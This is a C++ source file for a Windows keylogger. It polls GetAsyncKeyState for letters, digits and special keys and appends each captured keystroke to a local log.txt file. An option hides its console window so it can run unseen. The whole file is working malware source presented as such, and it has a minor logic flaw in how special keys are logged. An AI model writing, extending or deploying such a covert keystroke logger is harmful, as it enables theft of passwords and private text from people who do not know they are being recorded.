#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <fstream>
#include <string>
using namespace std;

void hideConsole()
{
    FreeConsole();
}

int cnt = 0, limit;

void saveLog(int number)
{
    cnt++;
    ofstream record("log.txt", ios_base::app);
    if (number == 43240)
        record << "[SPACE]";
    if (number == 43241)
        record << "[ENTER]";
    if (number == 43242)
        record << "[BACK_SPACE]";
    if (number == 43243)
        record << "[DELETE]";
    if (number == 43244)
        record << "[TAB]";
    if (number == 43245)
        record << "[ALT]";
    if (number == 43246)
        record << "[CAPS_LOCK]";
    if (number == 43247)
        record << "[LEFT_CONTROL]";
    if (number == 43248)
        record << "[RIGHT_CONTROL]";
    if (number == 43249)
        record << "[SHIFT]";
    else
    {
        record << (char)number;
    }
    record.close();
}

void keyLogger()
{
    int number;
    int temp;
    while (true)
    {
        if (cnt > limit)
            break;
        for (number = 65; number < 91; number++)
        {
            temp = GetAsyncKeyState(number);
            if (temp == -32767 && !GetAsyncKeyState(VK_SHIFT))
            {
                cout << (char)(number + 32);
                saveLog(number + 32);
            }
            else if (temp == -32767 && GetAsyncKeyState(VK_SHIFT))
            {
                cout << (char)number;
                saveLog(number);
            }
        }
        for (number = 48; number < 58; number++)
        {
            if (GetAsyncKeyState(number) == -32767)
            {
                cout << (char)number;
                saveLog(number);
            }
        }
        if (GetAsyncKeyState(VK_SPACE) == -32767)
            saveLog(43240);
        if (GetAsyncKeyState(VK_RETURN) == -32767)
            saveLog(43241);
        if (GetAsyncKeyState(VK_BACK) == -32767)
            saveLog(43242);
        if (GetAsyncKeyState(VK_DELETE) == -32767)
            saveLog(43243);
        if (GetAsyncKeyState(VK_TAB) == -32767)
            saveLog(43244);
        if (GetAsyncKeyState(VK_MENU) == -32767)
            saveLog(43245);
        if (GetAsyncKeyState(VK_CAPITAL) == -32767)
            saveLog(43246);
        if (GetAsyncKeyState(VK_LCONTROL) == -32767)
            saveLog(43247);
        if (GetAsyncKeyState(VK_RCONTROL) == -32767)
            saveLog(43248); 
        if (GetAsyncKeyState(VK_SHIFT) == -32767)
            saveLog(43249);
    }
}

int main()
{
    cout << "limit: ";
    cin >> limit;
    string A;
    cin >> A;
    if(A == "HIDE")
        hideConsole();
    keyLogger();
}